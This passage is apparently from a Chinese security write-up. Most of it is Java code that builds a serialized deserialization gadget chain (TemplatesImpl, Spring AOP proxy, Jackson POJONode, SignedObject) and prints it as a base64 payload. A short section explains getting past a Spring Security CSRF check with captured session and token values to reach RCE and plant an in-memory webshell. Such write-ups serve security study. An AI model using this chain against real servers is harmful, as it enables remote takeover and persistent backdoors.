+        <span class="n">CtMethod</span> <span class="n">writeReplace</span> <span class="o">=</span> <span class="n">ctClass0</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"writeReplace"</span><span class="o">);</span>
+        <span class="n">ctClass0</span><span class="o">.</span><span class="na">removeMethod</span><span class="o">(</span><span class="n">writeReplace</span><span class="o">);</span>
+        <span class="n">ctClass0</span><span class="o">.</span><span class="na">toClass</span><span class="o">();</span>
+
+
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">payloads</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class"</span><span class="o">));</span>
+        <span class="n">Templates</span> <span class="n">templatesImpl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templatesImpl</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">payloads</span><span class="o">});</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templatesImpl</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"aaaa"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templatesImpl</span><span class="o">,</span> <span class="s">"_tfactory"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+
+        <span class="n">POJONode</span> <span class="n">po1</span><span class="o">=</span> <span class="k">new</span> <span class="n">POJONode</span><span class="o">(</span><span class="n">makeTemplatesImplAopProxy</span><span class="o">(</span><span class="n">templatesImpl</span><span class="o">));</span>
+        <span class="n">BadAttributeValueExpException</span> <span class="n">ba1</span><span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">ba1</span><span class="o">,</span><span class="s">"val"</span><span class="o">,</span><span class="n">po1</span><span class="o">);</span>
+
+        <span class="n">KeyPairGenerator</span> <span class="n">keyPairGenerator</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">);</span>
+        <span class="n">keyPairGenerator</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>
+        <span class="n">KeyPair</span> <span class="n">keyPair</span> <span class="o">=</span> <span class="n">keyPairGenerator</span><span class="o">.</span><span class="na">genKeyPair</span><span class="o">();</span>
+        <span class="n">PrivateKey</span> <span class="n">privateKey</span> <span class="o">=</span> <span class="n">keyPair</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">();</span>
+        <span class="n">Signature</span> <span class="n">signingEngine</span> <span class="o">=</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">);</span>
+        <span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">(</span> <span class="n">ba1</span><span class="o">,</span> <span class="n">privateKey</span><span class="o">,</span> <span class="n">signingEngine</span><span class="o">);</span>
+
+        <span class="n">POJONode</span> <span class="n">jsonNodes</span> <span class="o">=</span> <span class="k">new</span> <span class="n">POJONode</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">jsonNodes</span><span class="o">,</span><span class="s">"_value"</span><span class="o">,</span><span class="n">signedObject</span><span class="o">);</span>
+        <span class="n">HotSwappableTargetSource</span> <span class="n">hotSwappableTargetSource1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HotSwappableTargetSource</span><span class="o">(</span><span class="n">jsonNodes</span><span class="o">);</span>
+        <span class="n">HotSwappableTargetSource</span> <span class="n">hotSwappableTargetSource2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HotSwappableTargetSource</span><span class="o">(</span><span class="k">new</span> <span class="n">XString</span><span class="o">(</span><span class="s">"1"</span><span class="o">));</span>
+        <span class="n">HashMap</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="n">makeMap</span><span class="o">(</span><span class="n">hotSwappableTargetSource1</span><span class="o">,</span> <span class="n">hotSwappableTargetSource2</span><span class="o">);</span>
+
+        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
+        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">hashMap</span><span class="o">);</span>
+        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+        <span class="n">String</span> <span class="n">res</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">barr</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">res</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">makeTemplatesImplAopProxy</span><span class="o">(</span><span class="n">Templates</span> <span class="n">templates</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">AdvisedSupport</span> <span class="n">advisedSupport</span> <span class="o">=</span> <span class="k">new</span> <span class="n">AdvisedSupport</span><span class="o">();</span>
+        <span class="n">advisedSupport</span><span class="o">.</span><span class="na">setTarget</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>
+        <span class="n">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.springframework.aop.framework.JdkDynamicAopProxy"</span><span class="o">).</span><span class="na">getConstructor</span><span class="o">(</span><span class="n">AdvisedSupport</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">InvocationHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">advisedSupport</span><span class="o">);</span>
+        <span class="n">Object</span> <span class="n">proxy</span> <span class="o">=</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">ClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">(),</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="n">handler</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">proxy</span><span class="o">;</span>
+    <span class="o">}</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">field</span><span class="o">,</span> <span class="n">Object</span> <span class="n">arg</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">field</span><span class="o">);</span>
+        <span class="n">f</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">f</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">arg</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="nf">makeMap</span> <span class="o">(</span><span class="n">Object</span> <span class="n">v1</span><span class="o">,</span> <span class="n">Object</span> <span class="n">v2</span> <span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">s</span><span class="o">,</span> <span class="s">"size"</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>
+        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">nodeC</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">nodeC</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.util.HashMap$Node"</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">catch</span> <span class="o">(</span> <span class="n">ClassNotFoundException</span> <span class="n">e</span> <span class="o">)</span> <span class="o">{</span>
+            <span class="n">nodeC</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.util.HashMap$Entry"</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">nodeCons</span> <span class="o">=</span> <span class="n">nodeC</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">nodeC</span><span class="o">);</span>
+        <span class="n">nodeCons</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+
+        <span class="n">Object</span> <span class="n">tbl</span> <span class="o">=</span> <span class="n">Array</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">nodeC</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>
+        <span class="n">Array</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">tbl</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">nodeCons</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">v1</span><span class="o">,</span> <span class="n">v1</span><span class="o">,</span> <span class="kc">null</span><span class="o">));</span>
+        <span class="n">Array</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">tbl</span><span class="o">,</span> <span class="mi">1</span><span class="o">,</span> <span class="n">nodeCons</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">v2</span><span class="o">,</span> <span class="n">v2</span><span class="o">,</span> <span class="kc">null</span><span class="o">));</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">s</span><span class="o">,</span> <span class="s">"table"</span><span class="o">,</span> <span class="n">tbl</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">s</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<h3 data-content="1" id="9649e35492e3b9fcf5b48903bd872e62">坑点</h3>
+<p>这里打过去的时候发现竟然报了403，可是就算没鉴权也应该是401才对</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227200756-d7af7e80-d568-1.png"/></p>
+<p>其实这里返回403的原因实际上是<code>Spring Security</code>​默认会开启csrf验证，如果要手动关闭这个CSRF的校验需要写入以下代码</p>
+<div class="highlight"><pre><span></span><span class="n">http</span><span class="o">.</span><span class="na">csrf</span><span class="o">().</span><span class="na">disable</span><span class="o">()</span>
+</pre></div>
+<p>那么这里默认是开启的，所以我们需要去登录的接口处拿到我们的对应的Session+CSRFtoken才可以访问该路由</p>
+<p>访问<code>/login</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227200806-dd5011d8-d568-1.png"/></p>
+<p>得到结果为</p>
+<div class="highlight"><pre><span></span><span class="nv">JSESSIONID</span><span class="o">=</span>B2F26059AB6C4FF450F5CA7B8D1C9FDE<span class="p">;</span>
+<span class="nv">_csrf</span><span class="o">=</span>f25909d7-6384-4a3f-869e-9831e7f4de99
+</pre></div>
+<p>然后带着Cookie+csrf就可以RCE了，接下来就是直接打内存马的事情了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227203141-2922cbc0-d56c-1.png"/></p>
+</div>
+</div>
